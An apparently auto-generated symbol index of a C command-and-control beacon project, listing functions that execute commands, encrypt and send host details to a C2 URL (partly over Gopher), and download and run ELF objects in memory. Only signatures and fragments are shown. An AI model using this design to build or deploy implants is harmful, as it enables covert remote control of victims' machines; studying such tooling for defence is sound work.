# Subsystem: v1

## beacons/v1/beacon.c
- Layer: utility
- Language: c
- Symbols:
  - `report_result` (function, line 23) `static void report_result(const bsb_config_t *cfg,
                           const char *command...`
  - `execute_command` (function, line 96) `static char *execute_command(const bsb_config_t *cfg, const char *command)`
  - `main` (function, line 145) `int main(void)`
  - `gethostname` (function, line 28) `gethostname(hostname, sizeof(hostname) - 1);`
  - `cJSON_AddStringToObject` (function, line 36) `cJSON_AddStringToObject(root, "output", output);`
  - `cJSON_AddNumberToObject` (function, line 39) `cJSON_AddNumberToObject(root, "pid", (double)getpid());`
  - `cJSON_AddNullToObject` (function, line 44) `cJSON_AddNullToObject(root, "result_portscan");`
  - `cJSON_Delete` (function, line 48) `cJSON_Delete(root);`
  - `free` (function, line 51) `free(ips);`
  - `RAND_bytes` (function, line 57) `RAND_bytes(iv_out, 16);`
  - `memcpy` (function, line 67) `memcpy(full_enc, iv_out, 16);`
  - `snprintf` (function, line 73) `snprintf(report_url, sizeof(report_url), "%s%s", cfg->c2.url, cfg->c2.report_uri);`
  - `srand` (function, line 147) `srand(time(NULL));`
  - `fprintf` (function, line 152) `fprintf(stderr, "config error: %s\n", cfg_err);`
  - `bsb_backoff_init` (function, line 163) `bsb_backoff_init(&backoff, cfg.backoff.base_seconds, cfg.backoff.max_seconds);`
  - `sleep` (function, line 173) `sleep(bsb_backoff_next(&backoff));`
  - `bsb_backoff_reset` (function, line 200) `bsb_backoff_reset(&backoff);`
  - `bsb_output_cleanup` (function, line 211) `bsb_output_cleanup();`
  - `_GNU_SOURCE` (macro, line 13) `#define _GNU_SOURCE`
- Depends on: `include/beacon_common.h`

## beacons/v1/gopher_beacon.c
- Layer: utility
- Doc: define _GNU_SOURCE include <stdio.h> include <stdlib.h> include <string.h> include <unistd.h> include <time.h> include <
- Language: c
- Symbols:
  - `MemoryStruct` (struct, line 47)
  - `Trampoline` (struct, line 54)
  - `SymbolResolver` (struct, line 62)
  - `TrampolineCache` (struct, line 68)
  - `__attribute__` (function, line 137) `static void __attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...`
  - `BeaconPrintf` (function, line 190) `void BeaconPrintf(int type, const char *fmt, ...)`
  - `BeaconOutput` (function, line 202) `void BeaconOutput(int type, const char *data, int len)`
  - `create_trampoline` (function, line 214) `static void* create_trampoline(void* target)`
  - `cleanup_trampolines` (function, line 250) `static void cleanup_trampolines(void)`
  - `get_or_create_trampoline` (function, line 265) `static void* get_or_create_trampoline(void* target)`
  - `WriteMemoryCallback` (function, line 297) `static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)`
  - `gopher_request` (function, line 314) `char* gopher_request(const char* host, int port, const char* selector, const char* method, const ...`
  - `base64_encode` (function, line 377) `char* base64_encode(const unsigned char* input, int len)`
  - `base64_decode` (function, line 393) `unsigned char* base64_decode(const char* input, int* len)`
  - `aes256_cfb_encrypt` (function, line 417) `unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,
            ...`
  - `aes256_cfb_decrypt` (function, line 444) `unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,
            ...`
  - `exec_cmd` (function, line 475) `char* exec_cmd(const char* cmd, int* out_len)`
  - `page_align` (function, line 506) `static size_t page_align(size_t size)`
  - `RunELF` (function, line 511) `int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize, 
           unsi...`
  - `get_local_ips` (function, line 893) `char* get_local_ips()`
  - `download_bof` (function, line 922) `unsigned char* download_bof(const char* bof_selector, size_t* out_size)`
  - `run_bof_and_capture` (function, line 950) `char* run_bof_and_capture(unsigned char* elf_data, uint32_t filesize,
                          c...`
  - `main` (function, line 994) `int main()`
  - `void` (function, line 60) `typedef void (*bof_func_t)(char*, int);`
  - `volatile` (function, line 143) `asm volatile( // Guardar frame pointer "push %%rbp\n\t" "mov %%rsp, %%rbp\n\t" // Guardar callee-saved registers "push %%rbx\n\t" "push %%r12\n\t" "push %%r13\n\t" "push %%r14\n\t" "push %%r15\n\t" //`
  - `va_start` (function, line 193) `va_start(args, fmt);`
  - `va_end` (function, line 197) `va_end(args);`
  - `memcpy` (function, line 208) `memcpy(g_beacon_output + g_output_len, data, len);`
  - `fprintf` (function, line 221) `fprintf(stderr, "[!] Trampolín: mmap falló\n");`
  - `munmap` (function, line 237) `munmap(code, code_size);`
  - `free` (function, line 254) `free(g_trampolines);`
  - `fflush` (function, line 319) `fflush(stdout);`
  - `snprintf` (function, line 326) `snprintf(full_selector, sizeof(full_selector), "/report/%s", post_data);`
  - `close` (function, line 345) `close(sockfd);`
  - `send` (function, line 350) `send(sockfd, req, strlen(req), 0);`
  - `BIO_set_flags` (function, line 383) `BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);`
  - `BIO_write` (function, line 384) `BIO_write(b64, input, len);`
  - `BIO_flush` (function, line 385) `BIO_flush(b64);`
  - `BIO_get_mem_ptr` (function, line 386) `BIO_get_mem_ptr(b64, &bptr);`
  - `BIO_free_all` (function, line 390) `BIO_free_all(b64);`
  - `AES_init_ctx` (function, line 420) `AES_init_ctx(&ctx, key);`
  - `AES_ECB_encrypt` (function, line 428) `AES_ECB_encrypt(&ctx, encrypted_iv);`
  - `memset` (function, line 437) `memset(iv_buf + block_size, 0, 16 - block_size);`
  - `strdup` (function, line 478) `return strdup("[!] Empty command");`
  - `pclose` (function, line 488) `pclose(fp);`
  - `perror` (function, line 682) `perror("calloc");`
  - `call_bof_isolated` (function, line 878) `call_bof_isolated(entry, (char*)argumentdata, (uintptr_t)argumentSize);`
  - `inet_ntop` (function, line 912) `inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN);`
  - `strcat` (function, line 914) `strcat(result, ip);`
  - `strlen` (function, line 918) `return strlen(result) > 0 ? result : strdup("127.0.0.1");`
  - `setvbuf` (function, line 996) `setvbuf(stdout, NULL, _IOLBF, 0);`
  - `printf` (function, line 998) `printf("[*] Beacon starting...\n");`
  - `srand` (function, line 1001) `srand(time(NULL));`
  - `sleep` (function, line 1028) `sleep(6);`
  - `gethostname` (function, line 1122) `gethostname(hostname, sizeof(hostname) - 1);`
  - `cJSON_AddStringToObject` (function, line 1130) `cJSON_AddStringToObject(root, "output", output);`
  - `cJSON_AddNumberToObject` (function, line 1133) `cJSON_AddNumberToObject(root, "pid", (double)getpid());`
  - `cJSON_AddNullToObject` (function, line 1138) `cJSON_AddNullToObject(root, "result_portscan");`
  - `cJSON_Delete` (function, line 1142) `cJSON_Delete(root);`
  - `RAND_bytes` (function, line 1148) `RAND_bytes(iv_out, 16);`
  - `_GNU_SOURCE` (macro, line 1) `#define _GNU_SOURCE`
  - `C2` (macro, line 29) `#define C2`
  - `CLIENT_ID` (macro, line 31) `#define CLIENT_ID`
  - `MALEABLE` (macro, line 32) `#define MALEABLE`
  - `USER_AGENTS_COUNT` (macro, line 33) `#define USER_AGENTS_COUNT`
